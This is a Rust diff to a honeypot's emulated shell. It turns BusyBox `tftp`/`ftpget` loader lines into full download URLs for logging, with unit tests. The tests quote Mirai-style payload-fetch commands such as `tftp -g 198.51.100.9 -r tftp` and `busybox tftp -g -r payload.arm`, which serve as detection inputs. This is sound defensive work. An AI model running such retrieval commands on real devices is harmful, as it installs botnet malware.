@@ -184,8 +184,10 @@ impl FakeShell {
             let mut evs = vec![self.command_event(metadata)];
             // A URL buried in a `sh -c "wget ...; ..."` chain (where the tokenizer's split loses the
             // quoting) is recovered by scanning the raw line. `download_target` returns a real token.
-            if let Some(url) = download_target(&parts).or_else(|| url_if_fetch_line(&decoded)) {
-                let sanitized_url = sanitize_value(url, MAX_URL_LEN);
+            if let Some(url) = download_target(&parts)
+                .or_else(|| url_if_fetch_line(&decoded).map(str::to_string))
+            {
+                let sanitized_url = sanitize_value(&url, MAX_URL_LEN);
                 evs.push(SensorEvent {
                     v: WIRE_VERSION,
                     source_ip: self.ctx.source_ip,
@@ -381,23 +383,95 @@ fn command_basename(token: &str) -> &str {
 /// fetchers and the BusyBox forms (`busybox wget URL`, `busybox tftp ...`) IoT loaders favour, so
 /// the `honeypot_file_download` event fires for those too - not only a bare `wget`/`curl`.
 ///
+/// `wget`/`curl` take a URL token, returned as-is. `tftp` and `ftpget` take a HOST and a FILE as
+/// separate arguments with no scheme, so the URL is synthesized (`tftp://host/file`,
+/// `ftp://host/file`): recording just the first non-flag token - which was the host for one flag
+/// order and the filename for another - produced a scheme-less fragment the fetcher could not
+/// parse, so a Mirai loader's `tftp -g HOST -r FILE` was logged and then silently never fetched.
+///
 /// The top-level command token is basename-resolved like `dispatch`, so `/bin/busybox tftp ...` is
 /// captured. The busybox *applet* token is matched raw, exactly like `cmd_busybox`/`is_busybox_applet`
 /// do: real busybox resolves an applet by bare name only, so `busybox /bin/tftp` is "applet not
 /// found" and must not be recorded as a fetch the persona did not answer in character.
-fn download_target<'a>(parts: &[&'a str]) -> Option<&'a str> {
+fn download_target(parts: &[&str]) -> Option<String> {
     const FETCHERS: [&str; 4] = ["wget", "curl", "tftp", "ftpget"];
     // BusyBox ships wget/tftp/ftpget applets but NOT curl, so `busybox curl` is "applet not found"
     // (see BUSYBOX_APPLETS) and must not be recorded as a fetch the persona did not answer in
     // character - the same principle the full-path `busybox /bin/tftp` case relies on.
     const BUSYBOX_FETCHERS: [&str; 3] = ["wget", "tftp", "ftpget"];
-    match parts.first().map(|c| command_basename(c)) {
-        Some(cmd) if FETCHERS.contains(&cmd) => first_non_flag_arg(&parts[1..]),
+    let (cmd, args) = match parts.first().map(|c| command_basename(c)) {
+        Some(cmd) if FETCHERS.contains(&cmd) => (cmd, &parts[1..]),
         Some("busybox") if parts.get(1).is_some_and(|a| BUSYBOX_FETCHERS.contains(a)) => {
-            first_non_flag_arg(&parts[2..])
+            (parts[1], &parts[2..])
         }
-        _ => None,
+        _ => return None,
+    };
+    match cmd {
+        "tftp" => tftp_url(args),
+        "ftpget" => ftpget_url(args),
+        _ => first_non_flag_arg(args).map(str::to_string),
     }
+}
+
+/// `tftp [-g|-p] [-l LOCAL] [-r REMOTE] HOST [PORT]` (BusyBox) -> `tftp://HOST[:PORT]/REMOTE`.
+/// `-r`/`-l` consume the next token; other flags do not. Flag order varies between loaders
+/// (`-g -r FILE HOST` and `-g HOST -r FILE` are both common), so positionals are collected rather
+/// than indexed. With only `-l` given, BusyBox uses it as the remote name too. No host -> `None`;
+/// a host with no file still yields `tftp://HOST`, since the retrieval host is evidence on its own.
+fn tftp_url(args: &[&str]) -> Option<String> {
+    let mut remote = None;
+    let mut local = None;
+    let mut positional = Vec::new();
+    let mut it = args.iter();
+    while let Some(&a) = it.next() {
+        match a {
+            "-r" => remote = it.next().copied(),
+            "-l" => local = it.next().copied(),
+            _ if a.starts_with('-') => {}
+            _ => positional.push(a),
+        }
+    }
+    let host = *positional.first()?;
+    let port = positional.get(1);
+    let file = remote.or(local);
+    Some(join_fetch_url("tftp", host, port.copied(), file))
+}
+
+/// `ftpget [-c] [-v] [-u USER] [-p PASS] [-P PORT] HOST [LOCAL] REMOTE` (BusyBox) ->
+/// `ftp://HOST[:PORT]/REMOTE`. `-u`/`-p`/`-P` consume the next token. The remote name is the LAST
+/// positional whenever at least two are present (`HOST REMOTE` or `HOST LOCAL REMOTE`). The
+/// fetcher does not retrieve `ftp://` (unsupported scheme, by design), but the retrieval attempt is
+/// still recorded accurately rather than as a bare host.
+fn ftpget_url(args: &[&str]) -> Option<String> {
+    let mut port = None;
+    let mut positional = Vec::new();
+    let mut it = args.iter();
+    while let Some(&a) = it.next() {
+        match a {
+            "-u" | "-p" => {
+                it.next();
+            }
+            "-P" => port = it.next().copied(),
+            _ if a.starts_with('-') => {}
+            _ => positional.push(a),
+        }
+    }
+    let host = *positional.first()?;
+    let file = if positional.len() >= 2 { positional.last().copied() } else { None };
+    Some(join_fetch_url("ftp", host, port, file))
+}
+
+fn join_fetch_url(scheme: &str, host: &str, port: Option<&str>, file: Option<&str>) -> String {
+    let mut url = format!("{scheme}://{host}");
+    if let Some(p) = port {
+        url.push(':');
+        url.push_str(p);
+    }
+    if let Some(f) = file {
+        url.push('/');
+        url.push_str(f.trim_start_matches('/'));
+    }
+    url
 }
 
 /// Recover a download URL from a command line that a fetch command hides from token-level parsing -
@@ -1078,10 +1152,16 @@ mod shell_detection_tests {
 
     #[test]
     fn download_target_recognizes_direct_and_busybox_forms() {
-        assert_eq!(download_target(&["wget", "http://x/y"]), Some("http://x/y"));
         assert_eq!(
-            download_target(&["busybox", "tftp", "-g", "-r", "x", "10.0.0.1"]),
-            Some("x")
+            download_target(&["wget", "http://x/y"]).as_deref(),
+            Some("http://x/y")
+        );
+        // Previously asserted `Some("x")` - the FILENAME - which was the defect: a scheme-less
+        // fragment the fetcher cannot parse. The host and file are separate tokens; the url is
+        // synthesized from both.
+        assert_eq!(
+            download_target(&["busybox", "tftp", "-g", "-r", "x", "10.0.0.1"]).as_deref(),
+            Some("tftp://10.0.0.1/x")
         );
         assert_eq!(download_target(&["busybox", "MIRAI"]), None);
         assert_eq!(download_target(&["ls", "-la"]), None);
@@ -1101,11 +1181,12 @@ mod shell_detection_tests {
                 "-r",
                 "payload.arm",
                 "198.51.100.9"
-            ]),
-            Some("payload.arm")
+            ])
+            .as_deref(),
+            Some("tftp://198.51.100.9/payload.arm")
         );
         assert_eq!(
-            download_target(&["/usr/bin/wget", "http://198.51.100.9/x"]),
+            download_target(&["/usr/bin/wget", "http://198.51.100.9/x"]).as_deref(),
             Some("http://198.51.100.9/x")
         );
         // The busybox APPLET token is matched raw, like cmd_busybox: `busybox /bin/tftp` is
@@ -1114,6 +1195,63 @@ mod shell_detection_tests {
             download_target(&["busybox", "/bin/tftp", "-g", "-r", "x", "10.0.0.1"]),
             None
         );
+    }
+
+    // The exact retrieval lines a live Mirai loader ran against the telnet sensor (documentation
+    // address in place of the real payload host). Both had been recorded as the bare host with no
+    // scheme, so the fetcher never queued either.
+    #[test]
+    fn download_target_synthesizes_urls_for_bare_tftp_and_ftpget() {
+        // `-g HOST -r FILE`: host before the -r operand.
+        assert_eq!(
+            download_target(&["tftp", "-g", "198.51.100.9", "-r", "tftp"]).as_deref(),
+            Some("tftp://198.51.100.9/tftp")
+        );
+        // `ftpget HOST LOCAL REMOTE`: the remote name is the last positional.
+        assert_eq!(
+            download_target(&["ftpget", "198.51.100.9", "f", "ftpget"]).as_deref(),
+            Some("ftp://198.51.100.9/ftpget")
+        );
+        // `ftpget HOST REMOTE` (local name defaulted).
+        assert_eq!(
+            download_target(&["ftpget", "198.51.100.9", "bin.arm"]).as_deref(),
+            Some("ftp://198.51.100.9/bin.arm")
+        );
+        // Explicit ports, both syntaxes.
+        assert_eq!(
+            download_target(&["tftp", "-g", "-r", "x", "198.51.100.9", "6969"]).as_deref(),
+            Some("tftp://198.51.100.9:6969/x")
+        );
+        assert_eq!(
+            download_target(&["ftpget", "-P", "2121", "198.51.100.9", "x"]).as_deref(),
+            Some("ftp://198.51.100.9:2121/x")
+        );
+        // `-l` alone names the remote file too (BusyBox behaviour); `-u`/`-p` operands are skipped,
+        // never mistaken for the host.
+        assert_eq!(
+            download_target(&["tftp", "-g", "-l", "local.bin", "198.51.100.9"]).as_deref(),
+            Some("tftp://198.51.100.9/local.bin")
+        );
+        assert_eq!(
+            download_target(&["ftpget", "-u", "anon", "-p", "x", "198.51.100.9", "f"]).as_deref(),
+            Some("ftp://198.51.100.9/f")
+        );
+        // A host with no file is still evidence; no host at all is not a fetch.
+        assert_eq!(
+            download_target(&["tftp", "-g", "198.51.100.9"]).as_deref(),
+            Some("tftp://198.51.100.9")
+        );
+        assert_eq!(download_target(&["tftp", "-g", "-r", "x"]), None);
+    }
+
+    #[test]
+    fn a_bare_tftp_line_emits_a_download_event_with_a_real_url() {
+        let (_out, events) = shell().handle_input("tftp -g 198.51.100.9 -r tftp");
+        let dl = events
+            .iter()
+            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
+            .expect("a bare tftp fetch must emit a download event");
+        assert_eq!(dl.metadata["url"], "tftp://198.51.100.9/tftp");
     }
 
     #[test]
